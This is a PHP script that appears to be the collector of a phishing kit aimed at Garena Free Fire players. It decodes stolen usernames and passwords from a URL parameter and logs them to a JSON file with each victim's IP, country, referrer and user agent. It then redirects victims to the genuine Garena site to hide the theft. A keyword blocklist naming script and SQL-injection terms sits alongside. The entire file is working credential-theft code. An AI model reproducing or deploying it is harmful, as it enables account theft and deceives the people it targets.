<?php
ob_start();

function protection($string) {
    $string = trim($string);
    if (mb_strlen($string) > 30) {
        return null;
    }
    $string = bad_word($string);
    $string = htmlspecialchars($string);
    $string = addslashes($string);
    return $string;
}

function bad_word($string) {
    global $badword;
    $new_word = '--';
    $bad_word_sql = isset($badword) ? explode(",", $badword) : [];
    $basmir = array('script', 'meta', 'SCRIPT', 'META', 'location', 'document', 'window', 'onabort', 'onactivate', 'onafterprint',
        'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste',
        'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu',
        'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate',
        'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange',
        'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture',
        'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend',
        'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit',
        'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload', 'javascript',
        'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'bgsound',
        'base', 'union', 'UNION', 'select', 'SELECT', 'mysql', 'MYSQL', 'shell', 'SHELL', 'Refresh', 'content');
    $string = str_ireplace($basmir, $new_word, $string);
    $string = str_ireplace($bad_word_sql, $new_word, $string);
    return $string;
}

function decryptData($encrypted) {
    $cleanedEncoded = substr($encrypted, 9); // Remove first 9 random characters
    return base64_decode($cleanedEncoded); // Decode the rest
}

function getOrCreateJsonFile() {
    // Check if any JSON file exists in the current directory
    $jsonFiles = glob('*.json');
    
    if (!empty($jsonFiles)) {
        // Return the first JSON file found
        return $jsonFiles[0];
    } else {
        // Create a new JSON file with random name
        $randomName = 'data_' . bin2hex(random_bytes(8)) . '.json';
        
        // Initialize with empty array
        file_put_contents($randomName, json_encode([], JSON_PRETTY_PRINT));
        
        return $randomName;
    }
}

function saveDataToJson($filename, $data) {
    // Read existing data
    $existingData = [];
    if (file_exists($filename)) {
        $jsonContent = file_get_contents($filename);
        $existingData = json_decode($jsonContent, true);

        // If decoding fails, start with empty array
        if (!is_array($existingData)) { 
            $existingData = [];
        }
    }

    // Add new data at the top
    array_unshift($existingData, $data);

    // Save back to file
    file_put_contents($filename, json_encode($existingData, JSON_PRETTY_PRINT));
}

// Check if the 'param' GET variable is set
$param = isset($_GET['data']) ? $_GET['data'] : 'No parameter provided';

$encodedData = $_GET['data'];

// Decode it
$decodedData = decryptData($encodedData);

// Use the same separator to split the values
$separator = "#@-@#";
list($username, $password, $user_id, $type) = explode($separator, $decodedData);

if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}

if (isset($_SERVER["HTTP_CF_IPCOUNTRY"])) {
    $userCountry = $_SERVER["HTTP_CF_IPCOUNTRY"];
} else { 
    $userCountry = "none"; 
}

//======================================//

ini_set('display_errors', 0);
$type = protection($type);

$user = intval($_GET['i']);
$ref = "ref";

$user_id_victim = protection($user_id);

$urls = array(
    'https://ff.garena.com/',
);

$randomlink = array_rand($urls, 1);
$thelink = $urls[$randomlink];

if ($_SERVER['HTTP_REFERER'] == $_SERVER['HTTP_REFERER']) {
    if (isset($user) and $user != 0) {
        // Do nothing
    } else {
        $user_id_victim = protection($user_id);
        $user_name_victims = protection($username);
        $user_pass_victims = protection($password);
        $ip = $_SERVER['REMOTE_ADDR'];
        $userCountry = $_SERVER["HTTP_CF_IPCOUNTRY"];
        $country = $userCountry;
        
        $ips = isset($ips) ? $ips : ''; // Prevent undefined variable notice
        $ips = substr($ips, 0, strpos($ips, ','));
        $date = time();
        $scama_id = protection($type);
        $reff = $_SERVER['HTTP_REFERER'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'];

        if (isset($user_name_victims) and isset($password) and $user_name_victims != '' and $user_pass_victims != '' and $ip != '101.2.177.232' and $ip != '31.170.160.103' and $ip != '127.0.0.1') {
            
            // Get or create JSON file
            $jsonFile = getOrCreateJsonFile();
            
            // Prepare data to save
            $victimData = array(
                'victime_user' => $user_name_victims,
                'victime_password' => $user_pass_victims,
                'victime_date' => $date,
                'victime_ip' => $ip,
                'country' => $country,
                'victime_scama' => $scama_id,
                'vic_reff' => $reff,
                'user_agent' => $user_agent,
                'timestamp' => date('Y-m-d H:i:s', $date)
            );
            
            // Save data to JSON file
            saveDataToJson($jsonFile, $victimData);

            header("Location: $thelink");
            
        } else {
            $ref = $_SERVER['HTTP_REFERER'];
            header("Location: $ref");
        }
    }
}

header("Location: $thelink");
?>